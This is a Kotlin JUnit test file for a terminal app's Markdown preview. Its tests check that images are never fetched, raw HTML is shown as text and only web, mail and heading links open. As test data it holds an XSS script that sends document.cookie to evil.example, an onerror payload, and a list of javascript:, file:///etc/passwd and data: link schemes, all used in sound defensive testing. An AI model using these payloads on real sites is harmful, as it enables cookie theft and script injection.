package com.jetsetslow.omniterm

import com.jetsetslow.omniterm.ui.HiKind
import com.jetsetslow.omniterm.ui.markdown.CHUNK_CHARS
import com.jetsetslow.omniterm.ui.markdown.CODE_CHUNK_LINES
import com.jetsetslow.omniterm.ui.markdown.MARKDOWN_PREVIEW_MAX_CHARS
import com.jetsetslow.omniterm.ui.markdown.MAX_MARKERS_PER_LINE
import com.jetsetslow.omniterm.ui.markdown.MAX_TABLE_COLUMNS
import com.jetsetslow.omniterm.ui.markdown.MarkdownPreviewResult
import com.jetsetslow.omniterm.ui.markdown.MdBlock
import com.jetsetslow.omniterm.ui.markdown.MdCode
import com.jetsetslow.omniterm.ui.markdown.MdDocument
import com.jetsetslow.omniterm.ui.markdown.MdHeading
import com.jetsetslow.omniterm.ui.markdown.MdLink
import com.jetsetslow.omniterm.ui.markdown.MdParagraph
import com.jetsetslow.omniterm.ui.markdown.MdRule
import com.jetsetslow.omniterm.ui.markdown.MdStyle
import com.jetsetslow.omniterm.ui.markdown.MdTableRow
import com.jetsetslow.omniterm.ui.markdown.MdText
import com.jetsetslow.omniterm.ui.markdown.buildMarkdownPreview
import com.jetsetslow.omniterm.ui.markdown.limitNesting
import com.jetsetslow.omniterm.ui.markdown.linkTarget
import com.jetsetslow.omniterm.ui.markdown.loadMarkdownPreview
import kotlinx.coroutines.CoroutineDispatcher
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.runBlocking
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Assert.fail
import org.junit.Test
import java.util.concurrent.atomic.AtomicInteger
import kotlin.coroutines.CoroutineContext
import kotlin.coroutines.cancellation.CancellationException

/**
 * The Markdown preview's model: what it shows of headings, lists, quotes, code, tables and links,
 * and what it never does. An image is never loaded, raw HTML is text, a link leads only to http,
 * https or mailto, and no file, however large, deep or odd, can hold the preview up or crash it.
 */
class MarkdownDocumentTest {

    private val marker = "image not loaded"

    private fun doc(text: String): MdDocument {
        val result = buildMarkdownPreview(text, marker)
        check(result is MarkdownPreviewResult.Ready) { "not ready: $result" }
        return result.document
    }

    private fun MdBlock.textOrNull(): String? = when (this) {
        is MdHeading -> text.text
        is MdParagraph -> text.text
        is MdCode -> text
        is MdTableRow -> cells.joinToString(" | ") { it.text }
        is MdRule -> null
    }

    private fun MdDocument.allText(): String = blocks.mapNotNull { it.textOrNull() }.joinToString("\n")

    private fun MdDocument.texts(): List<MdText> = blocks.flatMap {
        when (it) {
            is MdHeading -> listOf(it.text)
            is MdParagraph -> listOf(it.text)
            is MdTableRow -> it.cells
            else -> emptyList()
        }
    }

    private fun MdDocument.links(): List<MdLink> = texts().flatMap { t -> t.spans.mapNotNull { it.link } }

    private fun MdText.styleOf(needle: String): Set<MdStyle> {
        val at = text.indexOf(needle)
        check(at >= 0) { "no '$needle' in '$text'" }
        return spans.filter { at >= it.start && at < it.end }.map { it.style }.toSet()
    }

    private fun MdDocument.paragraph(containing: String): MdText =
        texts().first { containing in it.text }

    // --- What it shows ---------------------------------------------------------------------------

    @Test
    fun headingsCarryTheirLevelAndAnAnchor() {
        val d = doc("# Install OmniTerm\n\nText\n\n## Install OmniTerm\n\nSetext\n---\n\n###### Small")
        val headings = d.blocks.filterIsInstance<MdHeading>()
        assertEquals(listOf(1, 2, 2, 6), headings.map { it.level })
        assertEquals(listOf("Install OmniTerm", "Install OmniTerm", "Setext", "Small"), headings.map { it.text.text })
        assertEquals(listOf("install-omniterm", "install-omniterm-1", "setext", "small"), headings.map { it.anchor })
        assertEquals(d.blocks.indexOf(headings[1]), d.anchors["install-omniterm-1"])
    }

    @Test
    fun emphasisStrongStrikeAndCodeAreStyledWithoutTheirMarkers() {
        val t = doc("Some *soft* and **loud** and ~~gone~~ and `code \\* here` text.").paragraph("soft")
        assertEquals("Some soft and loud and gone and code \\* here text.", t.text)
        assertEquals(setOf(MdStyle.ITALIC), t.styleOf("soft"))
        assertEquals(setOf(MdStyle.BOLD), t.styleOf("loud"))
        assertEquals(setOf(MdStyle.STRIKE), t.styleOf("gone"))
        assertEquals(setOf(MdStyle.CODE), t.styleOf("code"))
        assertEquals(emptySet<MdStyle>(), t.styleOf("text"))
    }

    @Test
    fun listsNestAndNumberAndTaskItemsShowTheirBox() {
        val d = doc("- one\n- two\n  - inner\n\n3. three\n4. four\n\n- [ ] todo\n- [x] done\n")
        val paragraphs = d.blocks.filterIsInstance<MdParagraph>()
        fun of(text: String) = paragraphs.single { it.text.text == text }.nesting
        assertEquals(1, of("one").lists)
        assertEquals("•", of("one").marker)
        assertEquals(2, of("inner").lists)
        assertEquals("◦", of("inner").marker)
        assertEquals("3.", of("three").marker)
        assertEquals("4.", of("four").marker)
        assertEquals("☐", of("todo").marker)
        assertEquals("☑", of("done").marker)
        assertFalse("the box is drawn as the marker, not as text", d.allText().contains("[x]"))
    }

    @Test
    fun quotesNestAndKeepTheirText() {
        val d = doc("> outer\n>\n> > inner\n")
        val paragraphs = d.blocks.filterIsInstance<MdParagraph>()
        assertEquals(1, paragraphs.single { it.text.text == "outer" }.nesting.quotes)
        assertEquals(2, paragraphs.single { it.text.text == "inner" }.nesting.quotes)
    }

    @Test
    fun aFencedBlockIsColouredAsTheLanguageItNames() {
        val d = doc("```yaml\nservices:\n  web: # the site\n    image: nginx\n```\n\n```\nplain\n```")
        val codes = d.blocks.filterIsInstance<MdCode>()
        assertEquals("services:\n  web: # the site\n    image: nginx", codes[0].text)
        val comment = codes[0].text.indexOf("# the site")
        assertEquals(HiKind.COMMENT, codes[0].tokens.first { comment >= it.start && comment < it.end }.kind)
        assertEquals("plain", codes[1].text)
        assertTrue(codes[1].tokens.isEmpty())
    }

    @Test
    fun tablesKeepTheirCellsAndAlignment() {
        val d = doc("| Name | Port | Up |\n|:-----|-----:|:--:|\n| web | 443 | **yes** |\n| db | 5432 |\n")
        val rows = d.blocks.filterIsInstance<MdTableRow>()
        assertEquals(3, rows.size)
        assertTrue(rows[0].header && rows[0].first)
        assertEquals(listOf("Name", "Port", "Up"), rows[0].cells.map { it.text })
        assertEquals(listOf("web", "443", "yes"), rows[1].cells.map { it.text })
        assertEquals(setOf(MdStyle.BOLD), rows[1].cells[2].styleOf("yes"))
        assertEquals(listOf("db", "5432", ""), rows[2].cells.map { it.text })
        assertTrue("one table, one shape", rows.all { it.table === rows[0].table })
        assertEquals("START, END, CENTER", rows[0].table.alignments.joinToString())
    }

    @Test
    fun rulesAndLinksToHeadingsInTheSameFile() {
        val d = doc("Before\n\n---\n\nSee [the setup](#Setup).\n\n## Setup\n")
        assertEquals(1, d.blocks.count { it is MdRule })
        assertEquals(listOf(MdLink.Anchor("setup")), d.links())
        assertEquals(d.blocks.indexOfFirst { it is MdHeading }, d.anchors["setup"])
    }

    @Test
    fun webAndMailLinksAreLinksWithTheirWholeAddress() {
        val d = doc(
            "[docs](https://example.org/a?b=c#d), <https://auto.example>, www.bare.example, " +
                "mail <me@example.org> and [ref][r].\n\n[r]: http://ref.example/x\n",
        )
        assertEquals(
            listOf(
                MdLink.External("https://example.org/a?b=c#d"),
                MdLink.External("https://auto.example"),
                MdLink.External("https://www.bare.example"),
                MdLink.External("mailto:me@example.org"),
                MdLink.External("http://ref.example/x"),
            ),
            d.links(),
        )
        assertEquals(setOf(MdStyle.LINK), d.paragraph("docs").styleOf("docs"))
    }

    // --- What it never does: images --------------------------------------------------------------

    @Test
    fun anImageIsItsAltTextAndAMarkerAndItsAddressIsNeverRead() {
        val d = doc(
            "Logo: ![The *OmniTerm* logo](https://tracker.example/pixel.png \"title\") and " +
                "![](data:image/png;base64,AAAA) and ![ref][img]\n\n[img]: https://tracker.example/ref.png\n",
        )
        val text = d.paragraph("Logo")
        assertEquals("Logo: The OmniTerm logo image not loaded and image not loaded and ref image not loaded", text.text)
        assertEquals(setOf(MdStyle.IMAGE), text.styleOf(marker))
        assertTrue("no link to an image: ${d.links()}", d.links().isEmpty())
        assertFalse(d.allText().contains("tracker.example"))
        assertFalse(d.allText().contains("title"))
        assertFalse(d.allText().contains("base64"))
    }

    @Test
    fun anImageInsideALinkIsTheLinksTextAndStillNotLoaded() {
        val d = doc("[![badge](https://ci.example/badge.svg)](https://ci.example/run)")
        assertEquals(listOf(MdLink.External("https://ci.example/run")), d.links())
        assertEquals("badge image not loaded", d.allText())
    }

    // --- What it never does: HTML ----------------------------------------------------------------

    @Test
    fun rawHtmlIsShownAsItIsWritten() {
        val html = "<script>fetch('https://evil.example/?c=' + document.cookie)</script>\n<img src=\"https://evil.example/x.png\" onerror=\"alert(1)\">"
        val d = doc("$html\n\nInline <b>bold?</b> <a href=\"https://evil.example\">here</a> &amp; &#x41; &copy;\n")
        // Two HTML blocks, as CommonMark has it (a script block ends at its closing tag).
        val blocks = d.blocks.filterIsInstance<MdCode>()
        assertTrue(blocks.all { it.html })
        assertEquals(html, blocks.joinToString("\n") { it.text })
        val inline = d.paragraph("Inline")
        assertEquals("Inline <b>bold?</b> <a href=\"https://evil.example\">here</a> & A ©", inline.text)
        assertEquals(setOf(MdStyle.HTML), inline.styleOf("<b>"))
        assertEquals(emptySet<MdStyle>(), inline.styleOf("bold?"))
        assertTrue("an HTML anchor is not a link: ${d.links()}", d.links().isEmpty())
    }

    // --- What it never does: links to anything but the web and mail ------------------------------

    @Test
    fun onlyWebMailAndHeadingAddressesAreLinks() {
        for (address in listOf(
            "javascript:alert(1)", "JaVaScRiPt:alert(1)", "file:///etc/passwd", "content://com.android.contacts/data",
            "intent://scan/#Intent;scheme=zxing;end", "data:text/html,<script>alert(1)</script>", "vbscript:msgbox",
            "tel:+15550100", "sms:+15550100", "ftp://example.org/file", "ssh://root@example.org", "market://details?id=x",
            "../secret.md", "/etc/passwd", "relative/page.html", "//example.org/no-scheme", "http:example.org", "https://",
            "http://exa mple.org", "https://example.org/‮gnp.exe", "https://example.org/\u0000", "https://example.org/​",
            "mailto:", "#", "", "https://example.org/" + "a".repeat(3_000),
        )) {
            assertNull("'$address' must not be a link", linkTarget(address))
        }
        assertEquals(MdLink.External("http://example.org"), linkTarget("http://example.org"))
        assertEquals(MdLink.External("HTTPS://Example.org/Path"), linkTarget("HTTPS://Example.org/Path"))
        assertEquals(MdLink.External("mailto:me@example.org?subject=hi"), linkTarget("mailto:me@example.org?subject=hi"))
        assertEquals(MdLink.Anchor("setup"), linkTarget("#Setup"))
    }

    @Test
    fun aDangerousLinkShowsItsTextAsPlainText() {
        val d = doc(
            "[run](javascript:alert(1)) [file](file:///etc/passwd) [app](content://x/y) " +
                "[intent](intent://x#Intent;end) [data](data:text/html,hi) [hidden](&#106;avascript:alert(1)) " +
                "[esc](java\\script:alert(1)) <javascript:alert(1)> [rel](notes.md) [ref][bad]\n\n[bad]: javascript:alert(2)\n",
        )
        assertTrue("no link at all: ${d.links()}", d.links().isEmpty())
        val text = d.paragraph("run")
        assertTrue(text.spans.none { it.style == MdStyle.LINK })
        assertTrue(text.text, text.text.startsWith("run file app intent data hidden esc javascript:alert(1) rel ref"))
    }

    @Test
    fun aLinkInsideALinkIsNotASecondLink() {
        // A link's text is never another address that opens instead.
        val d = doc("[outer <https://inner.example> text](https://outer.example)")
        assertEquals(listOf(MdLink.External("https://outer.example")), d.links().distinct())
    }

    // --- Size, depth, time ------------------------------------------------------------------------

    @Test
    fun aFileOverTheLimitIsNotParsedAtAll() {
        val big = "# x\n" + "word ".repeat(1_000_000)
        val started = System.nanoTime()
        val result = buildMarkdownPreview(big, marker)
        assertEquals(MarkdownPreviewResult.TooLarge(big.length, MARKDOWN_PREVIEW_MAX_CHARS), result)
        assertTrue("answered at once", System.nanoTime() - started < 1_000_000_000L)
        assertTrue(buildMarkdownPreview("a".repeat(MARKDOWN_PREVIEW_MAX_CHARS), marker) is MarkdownPreviewResult.Ready)
    }

    @Test
    fun aLongParagraphAndALongCodeBlockAreDrawnInPieces() {
        val words = "word ".repeat(30_000).trim()
        val lines = (1..1_000).joinToString("\n") { "key$it: value # $it" }
        val d = doc("$words\n\n```yaml\n$lines\n```\n")
        val pieces = d.blocks.filterIsInstance<MdParagraph>()
        assertTrue(pieces.size > 30)
        assertTrue(pieces.all { it.text.text.length <= CHUNK_CHARS })
        assertTrue(pieces.drop(1).all { it.continued })
        assertEquals(words, pieces.joinToString("") { it.text.text }.trim())
        val code = d.blocks.filterIsInstance<MdCode>()
        assertTrue(code.all { it.text.count { c -> c == '\n' } < CODE_CHUNK_LINES })
        assertTrue(code.first().first && code.last().last && code.drop(1).none { it.first })
        assertEquals(lines, code.joinToString("\n") { it.text })
        // Each piece is coloured on its own lines: the comment on the last line is still a comment.
        val last = code.last()
        val at = last.text.indexOf("# 1000")
        assertEquals(HiKind.COMMENT, last.tokens.first { at >= it.start && at < it.end }.kind)
        assertTrue(code.all { piece -> piece.tokens.all { it.start >= 0 && it.end <= piece.text.length } })
    }

    @Test
    fun thousandsOfNestedQuotesAndListsNeitherOverflowNorHang() {
        // 20,000 quote markers on one line ran the parser out of memory: past 32 they are text.
        val quotes = ">".repeat(20_000) + " deep quote\n"
        // The rest of the line is one paragraph, drawn in pieces.
        val q = doc(quotes).blocks.filterIsInstance<MdParagraph>()
        assertTrue(q.all { it.nesting.quotes == MAX_MARKERS_PER_LINE })
        assertEquals(">".repeat(20_000 - MAX_MARKERS_PER_LINE) + " deep quote", q.joinToString("") { it.text.text })
        val lists = "- ".repeat(10_000) + "deep item\n"
        val l = doc(lists).blocks.filterIsInstance<MdParagraph>().last()
        assertTrue(l.text.text.endsWith("deep item"))
        assertEquals(MAX_MARKERS_PER_LINE, l.nesting.lists)
        // Nesting across lines is bounded by the size limit: 400 levels of indented items.
        val indented = (0 until 400).joinToString("\n") { " ".repeat(it * 2) + "- level $it" }
        val deepest = doc(indented).blocks.filterIsInstance<MdParagraph>().single { it.text.text == "level 399" }
        assertEquals(400, deepest.nesting.lists)
        // Lines of 32 quotes each, as many as fit: the most a file can hold at the most it may nest.
        val wall = ("> ".repeat(MAX_MARKERS_PER_LINE) + "x\n").repeat(MARKDOWN_PREVIEW_MAX_CHARS / 70)
        assertTrue(buildMarkdownPreview(wall, marker) is MarkdownPreviewResult.Ready)
        val ordered = "1. ".repeat(5_000) + "x\n"
        assertTrue(doc(ordered).allText().contains("x"))
        val mixed = (0 until 5_000).joinToString("") { if (it % 2 == 0) "> " else "- " } + "mixed\n"
        assertTrue(doc(mixed).allText().contains("mixed"))
        val emphasis = "*".repeat(20_000) + "x" + "*".repeat(20_000)
        assertTrue(buildMarkdownPreview(emphasis, marker) !is MarkdownPreviewResult.Unreadable)
        val brackets = "[".repeat(30_000) + "x" + "](https://example.org)".repeat(5_000)
        assertTrue(buildMarkdownPreview(brackets, marker) !is MarkdownPreviewResult.Unreadable)
    }

    @Test
    fun anUnterminatedFenceRunsToTheEndAndTheRestIsStillShown() {
        val d = doc("Before\n\n```bash\necho one\n# not a heading\n[not](https://a.link)")
        assertEquals("Before", (d.blocks.first() as MdParagraph).text.text)
        assertEquals("echo one\n# not a heading\n[not](https://a.link)", d.blocks.filterIsInstance<MdCode>().single().text)
        assertTrue(d.links().isEmpty())
        // A fence that never even gets a line.
        assertTrue(doc("```").blocks.single() is MdCode)
        assertTrue(doc("~~~~~~~~~~ yaml {.x}\n" + "a: b\n".repeat(5_000)).blocks.all { it is MdCode })
    }

    @Test
    fun aHugeTableShowsItsFirstColumnsAndSaysHowManyMore() {
        val columns = 200
        val header = (1..columns).joinToString("|", "|", "|") { "c$it" }
        val separator = (1..columns).joinToString("|", "|", "|") { "-" }
        val row = (1..columns).joinToString("|", "|", "|") { "v" }
        val text = header + "\n" + separator + "\n" + (row + "\n").repeat(400)
        val rows = doc(text).blocks.filterIsInstance<MdTableRow>()
        assertEquals(401, rows.size)
        assertTrue(rows.all { it.cells.size == MAX_TABLE_COLUMNS })
        assertEquals(columns - MAX_TABLE_COLUMNS, rows.first().table.hiddenColumns)
        // A row with far more cells than its header, and one cell far too long, stay bounded too.
        val wide = "|a|b|\n|-|-|\n|" + "x|".repeat(40_000) + "\n|" + "y".repeat(80_000) + "|z|\n"
        val wideRows = doc(wide).blocks.filterIsInstance<MdTableRow>()
        assertTrue(wideRows.all { it.cells.size == 2 })
        assertTrue(wideRows.last().cells[0].text.length <= 1_001)
        assertTrue(wideRows.first().table.widths.all { it in 3..40 })
    }

    @Test
    fun onlyLinesNestedPastTheLimitChange() {
        val ordinary = "# Title\n\n> > quote\n- - item\n1. 2. 3. numbered\n    code > > >\n"
        assertTrue("left exactly as it is", limitNesting(ordinary) === ordinary)
        val deep = "> ".repeat(MAX_MARKERS_PER_LINE + 3) + "x\n" + "1. ".repeat(MAX_MARKERS_PER_LINE + 1) + "y\nplain\n"
        assertEquals(
            "> ".repeat(MAX_MARKERS_PER_LINE) + "\\> > > x\n" + "1. ".repeat(MAX_MARKERS_PER_LINE) + "1\\. y\nplain\n",
            limitNesting(deep),
        )
    }

    @Test
    fun aParseThatTakesTooLongGivesUp() {
        val text = (1..2_000).joinToString("\n") { "- item $it with *emphasis* and `code`" }
        assertEquals(MarkdownPreviewResult.TooSlow, buildMarkdownPreview(text, marker, budgetMs = 0))
        assertTrue(buildMarkdownPreview(text, marker) is MarkdownPreviewResult.Ready)
    }

    @Test
    fun aPreviewNoLongerShownStopsAtOnce() {
        val text = (1..2_000).joinToString("\n") { "- item $it" }
        try {
            buildMarkdownPreview(text, marker, isActive = { false })
            fail("a cancelled preview went on")
        } catch (_: CancellationException) {
        }
        var checks = 0
        try {
            buildMarkdownPreview(text, marker, isActive = { ++checks < 50 })
            fail("a preview cancelled half-way went on")
        } catch (_: CancellationException) {
        }
        assertEquals(50, checks)
    }

    /** Counts the work it is handed and runs it on the default pool, never on the caller's thread. */
    private class CountingDispatcher : CoroutineDispatcher() {
        val dispatched = AtomicInteger()
        override fun isDispatchNeeded(context: CoroutineContext) = true
        override fun dispatch(context: CoroutineContext, block: Runnable) {
            dispatched.incrementAndGet()
            Dispatchers.Default.dispatch(context, block)
        }
    }

    @Test
    fun theParseRunsAwayFromTheCallersThread() {
        val background = CountingDispatcher()
        val caller = Thread.currentThread()
        var parsedOn: Thread? = null
        val result = runBlocking {
            loadMarkdownPreview("# Title\n\ntext", marker, background = background + kotlinx.coroutines.CoroutineName("preview"))
                .also { parsedOn = Thread.currentThread() }
        }
        assertTrue(result is MarkdownPreviewResult.Ready)
        assertTrue("the parse was handed to the background", background.dispatched.get() > 0)
        assertEquals("the result comes back to the caller", caller, parsedOn)
    }
}
